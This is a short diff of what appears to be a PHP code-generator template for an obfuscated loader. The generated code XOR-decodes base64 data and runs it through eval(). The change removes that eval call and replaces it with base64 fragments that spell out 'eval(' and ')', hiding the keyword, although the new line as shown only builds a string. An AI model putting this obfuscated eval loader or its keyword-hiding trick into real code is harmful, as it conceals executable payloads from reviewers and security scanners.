@@ -174,7 +174,7 @@ function $fun(string \$values)
             \$$da .= chr(ord(\$$f_name{\$i++ % strlen(\$$f_name)}) ^ ord(\$chars));
         }
     }
-    eval(base64_decode(\$$da));
+    base64_decode("ZXZhbCg=")."\"".base64_decode(\$$da)."\"".base64_decode("KQ==");
 }
 $fun(base64_decode("$b"));
 FULL;
